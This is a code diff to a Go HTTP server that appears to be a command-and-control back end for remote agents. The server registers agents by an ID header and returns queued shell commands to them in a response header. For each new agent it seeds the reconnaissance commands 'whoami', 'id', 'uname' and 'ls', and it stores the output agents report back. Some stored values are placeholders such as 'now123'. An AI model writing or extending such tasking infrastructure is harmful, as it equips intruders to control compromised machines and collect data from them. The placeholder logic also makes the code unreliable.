@@ -4,6 +4,9 @@ import (
 	"fmt"
 	"log"
 	"net/http"
+	"time"
+
+	"github.com/google/uuid"
 )
 
 type Server struct {
@@ -45,19 +48,14 @@ func (s *Server) getServeMux() (mux *http.ServeMux) {
 		db := getDB()
 		defer db.Close()
 
+		logStr := fmt.Sprintf("IP: %s | Path: %s", req.RemoteAddr, req.URL.Path)
+
 		agentID := req.Header.Get(s.IDHeader)
 		agentData := req.Header.Get(s.DataHeader)
 
-		getAgent(db, agentID)
-
-		cmd := getAgentCmd(agentID)
-		if cmd != "" {
-			w.Header().Set(s.CmdHeader, cmd)
-			log.Printf("%s header set with value %s", s.CmdHeader, cmd)
-		}
-
-		logStr := fmt.Sprintf("IP: %s | Path: %s", req.RemoteAddr, req.URL.Path)
 		if agentID != "" {
+			logStr += fmt.Sprintf(" | ClientID: %s", agentID)
+
 			if !agentExists(db, agentID) {
 				createAgent(db, DBAgent{
 					id:        agentID,
@@ -65,11 +63,21 @@ func (s *Server) getServeMux() (mux *http.ServeMux) {
 					updatedAt: "none",
 				})
 			}
-			logStr += fmt.Sprintf(" | ClientID: %s", agentID)
+
+			cmd, err := getAgentCmd(db, agentID)
+			if err == nil {
+				w.Header().Set(s.CmdHeader, cmd.command)
+				log.Printf("%s header set with value %s", s.CmdHeader, cmd)
+			} else {
+				fmt.Printf("adding a few cmds for agent %s", agentID)
+				for _, c := range []string{"whoami", "id", "uname", "ls"} {
+					createAgentCmd(db, DBCommand{id: uuid.NewString(), agentID: agentID, command: c, result: "", createdAt: fmt.Sprint(time.Now().Unix()), updatedAt: ""})
+				}
+			}
 		}
 
 		if agentData != "" {
-			updateAgentCmd(db, DBCommand{})
+			updateAgentCmd(db, DBCommand{agentID: agentID, command: agentData, result: agentData, updatedAt: "now123"})
 			logStr += fmt.Sprintf(" | Data: %s", agentData)
 		}
 		log.Print(logStr)
